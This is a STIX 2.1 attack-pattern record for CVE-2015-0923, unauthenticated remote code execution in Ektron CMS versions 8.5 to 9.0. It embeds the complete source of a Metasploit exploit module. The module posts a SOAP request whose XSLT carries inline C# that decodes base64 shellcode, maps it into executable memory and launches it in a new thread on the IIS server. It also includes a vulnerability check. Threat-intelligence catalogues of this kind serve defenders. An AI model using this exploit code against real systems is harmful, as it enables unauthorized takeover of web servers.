{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5542add9-d487-4fb3-bced-d5c85afb41fc",
    "created": "2024-08-14T16:52:28.542135Z",
    "modified": "2024-08-14T16:52:28.542139Z",
    "name": "Ektron 8.5, 8.7, 9.0 XSLT Transform Remote Code Execution",
    "description": "Ektron 8.5, 8.7 <= sp1, 9.0 < sp1 have vulnerabilities in various operations within the ServerControlWS.asmx web services. These vulnerabilities allow for RCE without authentication and execute in the context of IIS on the remote system. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/ektron_xslt_exec_ws.rb",
            "external_id": "ektron_xslt_exec_ws.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-0923"
        },
        {
            "source_name": "reference",
            "url": "http://www.websecuritywatch.com/xxe-arbitrary-code-execution-in-ektron-cms/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Ektron 8.5, 8.7, 9.0 XSLT Transform Remote Code Execution',\n      'Description'    => %q{ Ektron 8.5, 8.7 <= sp1, 9.0 < sp1 have\nvulnerabilities in various operations within the ServerControlWS.asmx\nweb services. These vulnerabilities allow for RCE without authentication and\nexecute in the context of IIS on the remote system.\n      },\n      'Author'         => [\n        'catatonicprime'\n      ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2015-0923' ],\n          [ 'US-CERT-VU', '377644' ],\n          [ 'URL', 'http://www.websecuritywatch.com/xxe-arbitrary-code-execution-in-ektron-cms/' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'           => 2048,\n          'StackAdjustment' => -3500\n        },\n      'Platform'       => 'win',\n      'Privileged'     => true,\n      'Targets'        =>\n        [\n          ['Windows 2008 R2 / Ektron CMS400 8.5', { 'Arch' => [ ARCH_X64, ARCH_X86 ] }]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2015-02-05'\n    ))\n\n    register_options(\n      [\n        OptInt.new('HTTP_DELAY', [true, 'Time that the HTTP Server will wait for the VBS payload request', 60]),\n        OptString.new('TARGETURI', [true, 'The URI path of the Ektron CMS', '/cms400min/']),\n        OptEnum.new('TARGETOP',\n          [\n            true,\n            'The vulnerable web service operation to exploit',\n            'ContentBlockEx',\n              [\n                'ContentBlockEx',\n                'GetBookmarkString',\n                'GetContentFlaggingString',\n                'GetContentRatingString',\n                'GetMessagingString'\n              ]\n          ])\n      ])\n  end\n\n\n  def vulnerable_param\n    return 'Xslt' if datastore['TARGETOP'] == 'ContentBlockEx'\n    'xslt'\n  end\n\n  def required_params\n    return '' if datastore['TARGETOP'] == 'ContentBlockEx'\n    '<showmode/>'\n  end\n\n  def target_operation\n    datastore['TARGETOP']\n  end\n\n  def prologue\n    <<-XSLT\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <#{target_operation} xmlns=\"http://www.ektron.com/CMS400/Webservice\">\n      #{required_params}\n      <#{vulnerable_param}>\n        <![CDATA[\n        <xsl:transform version=\"2.0\"\n          xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\n          xmlns:msxsl=\"urn:schemas-microsoft-com:xslt\"\n          xmlns:user=\"http://mycompany.com/mynamespace\">\n          <msxsl:script language=\"C#\" implements-prefix=\"user\">\nXSLT\n  end\n\n  def epilogue\n    <<-XSLT\n          </msxsl:script>\n          <xsl:template match=\"/\">\n            <xsl:value-of select=\"user:xml()\"/>\n          </xsl:template>\n        </xsl:transform>\n        ]]>\n      </#{vulnerable_param}>\n    </#{target_operation}>\n  </soap:Body>\n</soap:Envelope>\nXSLT\n  end\n\n  def check\n\n    fingerprint = rand_text_alpha(5 + rand(5))\n    xslt_data = <<-XSLT\n#{prologue}\n            public string xml() {\n              return \"#{fingerprint}\";\n            }\n#{epilogue}\nXSLT\n\n    res = send_request_cgi(\n      {\n        'uri'     => \"#{uri_path}WorkArea/ServerControlWS.asmx\",\n        'version' => '1.1',\n        'method'  => 'POST',\n        'ctype'   => \"text/xml; charset=UTF-8\",\n        'headers' => {\n          \"Referer\" => build_referer\n        },\n        'data' =>  xslt_data\n      })\n\n    if res and res.code == 200 and res.body =~ /#{fingerprint}/ and res.body !~ /Error/\n      return Exploit::CheckCode::Vulnerable\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def uri_path\n    uri_path = target_uri.path\n    uri_path << \"/\" if uri_path[-1, 1] != \"/\"\n    uri_path\n  end\n\n  def build_referer\n    if datastore['SSL']\n      schema = \"https://\"\n    else\n      schema = \"http://\"\n    end\n\n    referer = schema\n    referer << rhost\n    referer << \":#{rport}\"\n    referer << uri_path\n    referer\n  end\n\n  def exploit\n\n    print_status(\"Generating the EXE Payload and the XSLT...\")\n    fingerprint = rand_text_alpha(5 + rand(5))\n\n    xslt_data = <<-XSLT\n#{prologue}\n            private static UInt32 MEM_COMMIT = 0x1000;\n            private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n\n            [System.Runtime.InteropServices.DllImport(&quot;kernel32&quot;)]\n            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);\n\n            [System.Runtime.InteropServices.DllImport(&quot;kernel32&quot;)]\n            private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);\n\n            public string xml()\n            {\n              string shellcode64 = @&quot;#{Rex::Text.encode_base64(payload.encoded)}&quot;;\n              byte[] shellcode = System.Convert.FromBase64String(shellcode64);\n              UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n              System.Runtime.InteropServices.Marshal.Copy(shellcode , 0, (IntPtr)(funcAddr), shellcode .Length);\n              IntPtr hThread = IntPtr.Zero;\n              IntPtr pinfo = IntPtr.Zero;\n              UInt32 threadId = 0;\n              hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);\n              return &quot;#{fingerprint}&quot;;\n            }\n#{epilogue}\nXSLT\n\n    print_status(\"Trying to run the xslt transformation...\")\n    res = send_request_cgi(\n      {\n        'uri'     => \"#{uri_path}WorkArea/ServerControlWS.asmx\",\n        'version' => '1.1',\n        'method'  => 'POST',\n        'ctype'   => \"text/xml; charset=UTF-8\",\n        'headers' => {\n          \"Referer\" => build_referer\n        },\n        'data' => xslt_data\n      })\n    if res and res.code == 200 and res.body =~ /#{fingerprint}/ and res.body !~ /Error/\n      print_good(\"Exploitation was successful\")\n    else\n      fail_with(Failure::Unknown, \"There was an unexpected response to the xslt transformation request\")\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-02-05",
    "x_mitre_platforms": [
        "win'"
    ]
}